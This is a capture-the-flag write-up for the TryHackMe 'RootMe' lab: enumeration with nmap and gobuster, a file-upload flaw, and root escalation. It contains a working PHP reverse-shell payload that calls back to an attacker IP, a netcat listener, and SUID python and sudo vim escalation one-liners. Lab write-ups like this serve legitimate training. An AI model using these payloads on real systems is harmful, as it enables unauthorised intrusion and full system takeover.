# TryHackMe - RootMe  
🔗 https://tryhackme.com/room/rootme

## 🎯 Objective

The goal of this room is to exploit a vulnerable web server to gain a reverse shell, escalate privileges, and retrieve the root flag. It simulates a typical beginner-level Linux web server penetration test scenario.

---

## 🖥️ Target Information

| Property     | Value                   |
|--------------|-------------------------|
| IP Address   | 10.10.84.242            |
| OS           | Ubuntu Linux (inferred) |
| Web Server   | Apache 2.4.29           |
| SSH Server   | OpenSSH 7.6p1           |

---

## 🔍 1. Enumeration

### 🔧 Nmap Scan

Command:
nmap -sV -O 10.10.84.242

- Results:
    - 22/tcp — OpenSSH 7.6p1 (Ubuntu)
    - 80/tcp — Apache httpd 2.4.29 (Ubuntu)
- 💡 The Apache and OpenSSH versions suggest this is likely Ubuntu 18.04.

---

### 🔍 Directory Brute Force with Gobuster

Command:
gobuster dir -u http://10.10.84.242 -w /usr/share/wordlists/dirb/common.txt -x php

- Discovered Paths:
    - /uploads → 301 redirect
    - /css → 301 redirect
    - /js → 301 redirect
    - /panel → 301 redirect ✅ Login panel with file upload
    - /server-status → 403 Forbidden
- 💡 The /panel directory presented a web admin interface that allowed file uploads, making it a potential attack vector.

---

## 💥 2. Exploitation

### 🔁 Reverse Shell Setup

Step 1: Start a netcat listener on the attacker's machine

Command:
nc -lvnp 12345

Step 2: Create and upload the following PHP reverse shell

Payload:
<?php
$ip = '10.10.126.108';  // Your attacker IP
$port = 12345;
$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/bash -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>

Step 3: Access the uploaded file at /uploads/<filename>.php to trigger the shell

✅ Reverse shell obtained as www-data.

---

## 🔓 3. Privilege Escalation

### 🔍 SUID Binary Enumeration

Command:
find / -user root -perm -u=s -type f 2>/dev/null

📌 Key SUID binary found:
/usr/bin/python

---

### 🧪 Method 1: SUID Python Exploit

Command:
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'

✅ Root shell obtained.

---

### 🧪 Method 2: sudo + vim

Step 1: Check sudo permissions

Command:
sudo -l

Output:
(ALL) NOPASSWD: /usr/bin/vim

Step 2: Escape to shell using:

Command:
sudo vim -c ':!bash'

✅ Root shell obtained via vim.

---

## 🗝️ 4. Post-Exploitation

- user.txt: Not found (possibly deleted or hidden)
- root.txt: Found at /root/root.txt after privilege escalation

---

## 📚 Lessons Learned

- File upload vulnerabilities can lead directly to RCE if not validated.
- Always check for SUID binaries — python/perl can lead to easy root access.
- `sudo -l` often exposes overlooked escalation paths like vim, less, etc.
- The basic attack chain (RCE → Shell → Escalation) is essential to understand.

---

## ✅ Summary

| Phase                | Status            |
|---------------------|-------------------|
| Enumeration          | ✅ Completed       |
| Exploitation         | ✅ File upload → Reverse shell |
| Reverse Shell        | ✅ Obtained as www-data |
| Privilege Escalation | ✅ Python + sudo vim |
| Root Flag            | ✅ Retrieved       |
